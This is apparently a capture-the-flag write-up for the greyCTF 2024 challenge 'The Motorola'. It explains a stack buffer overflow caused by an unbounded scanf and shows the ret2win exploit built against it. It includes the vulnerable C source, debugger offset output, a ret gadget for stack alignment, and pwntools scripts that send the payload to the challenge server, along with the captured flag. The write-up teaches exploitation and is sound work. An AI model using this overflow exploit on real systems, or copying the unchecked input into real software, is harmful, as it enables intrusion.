---
title: The Motorola
date: 2024-04-27
tags: 
- pwn
- rop
- author-fs
categories: greyCTF 2024
---

solved by {% person fs %}

> i bet u wont guess my pin

We are given some source code

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>


char* pin;

// this is the better print, because i'm cool like that ;)
void slow_type(char* msg) {
	int i = 0;
	while (1) {
		if (!msg[i])
			return;
		putchar(msg[i]);
		usleep(5000);
		i += 1;
	}
}

void view_message() {
	int fd = open("./flag.txt", O_RDONLY);
	char* flag = calloc(0x50, sizeof(char));
	read(fd , flag, 0x50);
	close(fd);
	slow_type("\n\e[1;93mAfter several intense attempts, you successfully breach the phone's defenses.\nUnlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.\nThe once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.\n\e[0m");
	printf("\n%s\n", flag);
	exit(0);
}

void retrieve_pin(){
	FILE* f = fopen("./pin", "r");
	pin = malloc(0x40);
	memset(pin, 0, 0x40);
	fread(pin, 0x30, 0x1, f);
	fclose(f);
}

void login() {
	char attempt[0x30];
	int count = 5;

	for (int i = 0; i < 5; i++) {
		memset(attempt, 0, 0x30);
		printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
		printf("PIN: ");
		scanf("%s", attempt);
		if (!strcmp(attempt, pin)) {
			view_message();
		}
	}
	slow_type("\n\e[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\e[0m\n\n");
}

void banner() {

	slow_type("\e[1;33mAs you breached the final door to TACYERG's hideout, anticipation surged.\nYet, the room defied expectations – disorder reigned, furniture overturned, documents scattered, and the vault empty.\n'Yet another dead end,' you muttered under your breath.\nAs you sighed and prepared to leave, a glint caught your eye: a cellphone tucked away under unkempt sheets in a corner.\nRecognizing it as potentially the last piece of evidence you have yet to find, you picked it up with a growing sense of anticipation.\n\n\e[0m");

    puts("                         .--.");
	puts("                         |  | ");
	puts("                         |  | ");
	puts("                         |  | ");
	puts("                         |  | ");
	puts("        _.-----------._  |  | ");
	puts("     .-'      __       `-.  | ");
	puts("   .'       .'  `.        `.| ");
	puts("  ;         :    :          ; ");
	puts("  |         `.__.'          | ");
	puts("  |   ___                   | ");
	puts("  |  (_M_) M O T O R A L A  | ");
	puts("  | .---------------------. | ");
	puts("  | |                     | | ");
	puts("  | |      \e[0;91mYOU HAVE\e[0m       | | ");
	puts("  | |  \e[0;91m1 UNREAD MESSAGE.\e[0m  | | ");
	puts("  | |                     | | ");
	puts("  | |   \e[0;91mUNLOCK TO VIEW.\e[0m   | | ");
	puts("  | |                     | | ");
	puts("  | `---------------------' | ");
	puts("  |                         | ");
	puts("  |                __       | ");
	puts("  |  ________  .-~~__~~-.   | ");
	puts("  | |___C___/ /  .'  `.  \\  | ");
	puts("  |  ______  ;   : OK :   ; | ");
	puts("  | |__A___| |  _`.__.'_  | | ");
	puts("  |  _______ ; \\< |  | >/ ; | ");
	puts("  | [_=]						\n");

	slow_type("\e[1;94mLocked behind a PIN, you attempt to find a way to break into the cellphone, despite only having 5 tries.\e[0m\n\n");
}


void init() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	retrieve_pin();
	printf("\e[2J\e[H");
}

int main() {
	init();
	banner();
	login();
}

```
While it is quite a lot of code, most of it is redundant and a bit annoying (slow_type) and the only relevant function that exists is login(). 

From this code, it's simple. The contents of the pin is being read and copied over to a variable. We are then allowed to try to guess the pin and if we guess correctly, view_message() is called and the flag is printed out.

The vulnerability is pretty obvious in the scanf() function called in login. 

```c
char attempt[0x30];
...//ignore the code in between
scanf("%s", attempt);//does not check how much input we give it so we could give it like 1000 bytes of input and crash the program (segfault)
```
scanf() doesn't check how much input we give it so we could give input more than the size of attempt (0x30) and cause a buffer overflow. We can then utilise a ret2win attack to call the view_message() function via the buffer overflow. If you want to know how ret2win and buffer overflows work, it's explained here: https://rwandi-ctf.github.io/greyCTF2024/babygoods/

Anyway, just like the babygoods challenge, all we have to do is find the offset to rip register using rbp's offset+8 and call view_message()

```
 R10  0x0
*R11  0x202
 R12  0x0
*R13  0x7fffffffdd68 —▸ 0x7fffffffe115 ◂— 'SYSTEMD_EXEC_PID=2172'
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401300 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616169 ('iaaaaaaa')
*RSP  0x7fffffffdc38 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401564 (login+197) ◂— ret 
─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401564 <login+197>    ret    <0x616161616161616a>










──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc38 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffdc40 ◂— 'kaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffdc48 ◂— 'laaaaaaamaaa'
03:0018│     0x7fffffffdc50 ◂— 0x6161616d /* 'maaa' */
04:0020│     0x7fffffffdc58 —▸ 0x401783 (main) ◂— endbr64 
05:0028│     0x7fffffffdc60 ◂— 0x100000000
06:0030│     0x7fffffffdc68 —▸ 0x7fffffffdd58 —▸ 0x7fffffffe0e3 ◂— '/home/xor8ex/greyctf/pwn/motor/distribution/chall'
07:0038│     0x7fffffffdc70 —▸ 0x7fffffffdd58 —▸ 0x7fffffffe0e3 ◂— '/home/xor8ex/greyctf/pwn/motor/distribution/chall'
────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401564 login+197
   1 0x616161616161616a
   2 0x616161616161616b
   3 0x616161616161616c
   4       0x6161616d
   5         0x401783 main
   6      0x100000000
   7   0x7fffffffdd58
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l "iaaaaaaa"
Finding cyclic pattern of 8 bytes: b'iaaaaaaa' (hex: 0x6961616161616161)
Found at offset 64
pwndbg> 
```
Using the exploitation method that we used in babygoods challenge, we attempt to provide a 100 byte cyclic pattern and find the offset of rbp which gave us 64. We then +8 to it to give us the offset to rip register since rbp and rip would be right next to each other in the stack and this gives us 72.

We then find the address of view_message().

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401140  putchar@plt
0x0000000000401150  puts@plt
0x0000000000401160  fread@plt
0x0000000000401170  fclose@plt
0x0000000000401180  setbuf@plt
0x0000000000401190  printf@plt
0x00000000004011a0  memset@plt
0x00000000004011b0  close@plt
0x00000000004011c0  read@plt
0x00000000004011d0  calloc@plt
0x00000000004011e0  strcmp@plt
0x00000000004011f0  malloc@plt
0x0000000000401200  open@plt
0x0000000000401210  fopen@plt
0x0000000000401220  __isoc99_scanf@plt
0x0000000000401230  exit@plt
0x0000000000401240  usleep@plt
0x0000000000401250  _start
0x0000000000401280  _dl_relocate_static_pie
0x0000000000401290  deregister_tm_clones
0x00000000004012c0  register_tm_clones
0x0000000000401300  __do_global_dtors_aux
0x0000000000401330  frame_dummy
0x0000000000401336  slow_type
0x000000000040138e  view_message
0x000000000040141d  retrieve_pin
0x000000000040149f  login
0x0000000000401565  banner
0x0000000000401732  init
0x0000000000401783  main
0x00000000004017b0  _fini
pwndbg> 
```
We can see that view_message() located at 0x40138e. If we are doing this challlenge locally, we could just reuse the babygoods exploit script and pwn this binary. 
```py
from pwn import *

#p=remote("challs.nusgreyhats.org","30211")
p=process("./chall")
p.recvuntil(b"PIN: ")
p.sendline(b"A"*72+p64(0x000000000040138e))

print(p.recvall())                                                                                  
```
But we were meant to connect to the remote server and exploit the binary and when i tried running the script to connect to remote server, it failed. I kept changing the payload and testing it for 30 minutes before i realised that stack alignment was a thing. 

If you want to learn stack alignment is, you can check out this https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment which explains more about it but essentially, if your payload is delivered in a way where your stack is not 16-byte aligned (we are dealing with x64 system), it won't work and you'd be hard struck on this challenge just like i was.

To fix this issue, you have to add a return (ret) gadget (gadgets are a whole new topic so i won't be talking about it but it's like mini crumbs of assembly that exists within the binary) right before the view_message()'s address.

If we were to run ROPgadget on the binary, we would find the ret gadget is located at 0x000000000040101a.

```
┌──()-[~/greyctf/pwn/motor/distribution]
└─$ ROPgadget --binary ./chall 
...//random gadgets that we do not care about
0x000000000040101a : ret
```

Now, we just have to modify our payload just a bit to include and run it against the remote server. Below is the final exploit script.

```py
from pwn import *

p=remote("challs.nusgreyhats.org","30211")
#p=process("./chall")
p.recvuntil(b"PIN: ")
p.sendline(b"A"*72+p64(0x000000000040101a)+p64(0x000000000040138e))

print(p.recvall())  
```
```
┌──()-[~/greyctf/pwn/motor/distribution]
└─$ python3 exploit.py                                                                  
[+] Opening connection to challs.nusgreyhats.org on port 30211: Done
[+] Receiving all data: Done (609B)
[*] Closed connection to challs.nusgreyhats.org port 30211
b"\n\x1b[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\x1b[0m\n\n\n\x1b[1;93mAfter several intense attempts, you successfully breach the phone's defenses.\nUnlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.\nThe once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.\n\x1b[0m\ngrey{g00d_w4rmup_for_p4rt_2_hehe}\n\n"

```

If we were to run this script, we would get our flag to be 

```grey{g00d_w4rmup_for_p4rt_2_hehe}```
